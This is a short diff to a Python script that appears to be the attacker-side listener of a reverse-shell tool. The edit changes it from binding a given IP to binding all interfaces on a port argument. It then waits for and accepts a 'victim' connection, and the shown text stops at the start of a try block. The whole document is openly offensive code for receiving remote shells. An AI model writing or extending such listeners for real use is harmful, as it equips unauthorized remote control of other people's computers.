@@ -1,13 +1,12 @@
 import socket
 import sys
 
-ip = sys.argv[1]
-port = sys.argv[2]
+port = sys.argv[1]
 attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 attacker.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 4096)
-attacker.bind((ip, int(port)))
+attacker.bind(('', int(port)))
 attacker.listen(1)
-print(f'Listening on {ip}:{port}')
+print(f'Listening on [any]:{port}')
 victim, victim_ip = attacker.accept()
 print(f'Connection from {victim_ip}')
 try:
